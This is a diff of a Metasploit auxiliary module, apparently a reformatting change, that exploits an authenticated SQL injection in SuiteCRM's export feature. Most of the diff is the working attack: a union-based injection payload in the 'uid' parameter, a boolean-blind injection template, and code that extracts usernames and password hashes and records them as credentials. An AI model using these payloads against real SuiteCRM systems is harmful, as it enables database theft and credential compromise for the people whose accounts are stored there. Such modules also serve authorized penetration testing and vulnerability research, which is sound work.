@@ -5,45 +5,44 @@
 
 class MetasploitModule < Msf::Auxiliary
 
-    include Msf::Auxiliary::Scanner
-    include Msf::Exploit::SQLi
-    include Msf::Exploit::Remote::HttpClient
-    include Msf::Exploit::SQLi::BooleanBasedBlindMixin
+  include Msf::Auxiliary::Scanner
+  include Msf::Exploit::SQLi
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::SQLi::BooleanBasedBlindMixin
 
-
-    def initialize(info = {})
-      super(
-        update_info(
-          info,
-          'Name' => 'SuiteCRM authenticated SQL injection in export functionality',
-          'Description' => %q{ },
-          'Author' => [
-            'Exodus Intelligence', # Advisory
-            'jheysel-r7', # poc + msf module
-          ],
-          'License' => MSF_LICENSE,
-          'References' => [
-            ['URL', 'https://blog.exodusintel.com/2022/06/09/salesagility-suitecrm-export-request-sql-injection-vulnerability/']
-          ],
-          #TODO - update actions
-          #
-          'Actions' => [
-            ['Dump tables', { 'Description' => 'Dumps database tables' }]
-          ],
-          'DefaultAction' => 'Dump tables',
-          'DisclosureDate' => '2022-07-27',
-          'Notes' => {
-            'Stability' => [CRASH_SAFE],
-            'SideEffects' => [IOC_IN_LOGS]
-          },
-          'Privileged' => true,
-        )
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'SuiteCRM authenticated SQL injection in export functionality',
+        'Description' => %q{ },
+        'Author' => [
+          'Exodus Intelligence', # Advisory
+          'jheysel-r7', # poc + msf module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['URL', 'https://blog.exodusintel.com/2022/06/09/salesagility-suitecrm-export-request-sql-injection-vulnerability/']
+        ],
+        # TODO: - update actions
+        #
+        'Actions' => [
+          ['Dump tables', { 'Description' => 'Dumps database tables' }]
+        ],
+        'DefaultAction' => 'Dump tables',
+        'DisclosureDate' => '2022-07-27',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS]
+        },
+        'Privileged' => true
       )
-      register_options [
-                         OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),
-                         OptString.new('USERNAME', [true, 'Username of user with administrative rights', 'admin']),
-                         OptString.new('PASS', [true, 'Password for administrator', 'admin']),
-                       ]
+    )
+    register_options [
+      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),
+      OptString.new('USERNAME', [true, 'Username of user with administrative rights', 'admin']),
+      OptString.new('PASS', [true, 'Password for administrator', 'admin']),
+    ]
   end
 
   def authenticate
@@ -118,56 +117,55 @@ class MetasploitModule < Msf::Auxiliary
 
   def union_based_injection
     res = send_request_cgi({
-                             'method' => 'POST',
-                             'keep_cookies' => true,
-                             'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
-                             'encode_params' => false,
-                             'vars_post' => {
-                               'uid' => "\\,))+UNION+select+*+from+users;+--+&module=Accounts",
-                               'module' => "Accounts",
-                               'action' => "index"
-                             },
-                           })
+      'method' => 'POST',
+      'keep_cookies' => true,
+      'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
+      'encode_params' => false,
+      'vars_post' => {
+        'uid' => '\\,))+UNION+select+*+from+users;+--+&module=Accounts',
+        'module' => 'Accounts',
+        'action' => 'index'
+      }
+    })
 
     table = Rex::Text::Table.new('Header' => 'Users', 'Indent' => 1, 'Columns' => 'users')
 
     res.body.each_line do |user|
-      username =  user.match(/"([\w\s]+)",/)
-      next if username[1] == "Name"
+      username = user.match(/"([\w\s]+)",/)
+      next if username[1] == 'Name'
+
       # binding.pry
       create_credential({
-                          workspace_id: myworkspace_id,
-                          origin_type: :service,
-                          module_fullname: fullname,
-                          username:  username[1],
-                          service_name: 'SuiteCRM',
-                          address: datastore['RHOSTS'],
-                          port: datastore['RPORT'],
-                          protocol: 'tcp',
-                          status: Metasploit::Model::Login::Status::UNTRIED
-                        })
+        workspace_id: myworkspace_id,
+        origin_type: :service,
+        module_fullname: fullname,
+        username: username[1],
+        service_name: 'SuiteCRM',
+        address: datastore['RHOSTS'],
+        port: datastore['RPORT'],
+        protocol: 'tcp',
+        status: Metasploit::Model::Login::Status::UNTRIED
+      })
       # table.add_row(['users', username[1]])
       print_good("Found user: #{username[1]}")
-
     end
 
     # print_good(table.to_s)
-
   end
 
   def dump_table_fields
     @sqli = create_sqli(dbms: MySQLi::BooleanBasedBlind, opts: { hex_encode_strings: true }) do |payload|
       res = send_request_cgi({
-                               'method' => 'POST',
-                               'keep_cookies' => true,
-                               'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
-                               'encode_params' => false,
-                               'vars_post' => {
-                                 'uid' => "ad71889b-7922-cb54-124b-62bcc053419d,\\,))+AND+#{payload};+--+",
-                                 'module' => "Accounts",
-                                 'action' => "index"
-                               },
-                             })
+        'method' => 'POST',
+        'keep_cookies' => true,
+        'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
+        'encode_params' => false,
+        'vars_post' => {
+          'uid' => "ad71889b-7922-cb54-124b-62bcc053419d,\\,))+AND+#{payload};+--+",
+          'module' => 'Accounts',
+          'action' => 'index'
+        }
+      })
       # Every payload contains either a quote or a comma which doesn't work for this
       fail_with Failure::Unreachable, 'Connection failed' unless res
       res
@@ -187,30 +185,30 @@ class MetasploitModule < Msf::Auxiliary
 
     data.each do |user|
       create_credential({
-                          workspace_id: myworkspace_id,
-                          origin_type: :service,
-                          module_fullname: fullname,
-                          username: user[0],
-                          private_type: :nonreplayable_hash,
-                          jtr_format: identify_hash(user[1]),
-                          private_data: user[1],
-                          service_name: 'SuiteCRM',
-                          address: ip,
-                          port: datastore['RPORT'],
-                          protocol: 'tcp',
-                          status: Metasploit::Model::Login::Status::UNTRIED
-                        })
+        workspace_id: myworkspace_id,
+        origin_type: :service,
+        module_fullname: fullname,
+        username: user[0],
+        private_type: :nonreplayable_hash,
+        jtr_format: identify_hash(user[1]),
+        private_data: user[1],
+        service_name: 'SuiteCRM',
+        address: ip,
+        port: datastore['RPORT'],
+        protocol: 'tcp',
+        status: Metasploit::Model::Login::Status::UNTRIED
+      })
       table << user
     end
 
     if table.rows.empty?
-      print_bad("The dump_tables_fields method was unsuccessful")
+      print_bad('The dump_tables_fields method was unsuccessful')
     else
       print_good(table.to_s)
     end
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     authenticate unless @authenticated
     fail_with Failure::NoAccess, 'Unable to authenticate to SuiteCRM' unless @authenticated
     dump_table_fields
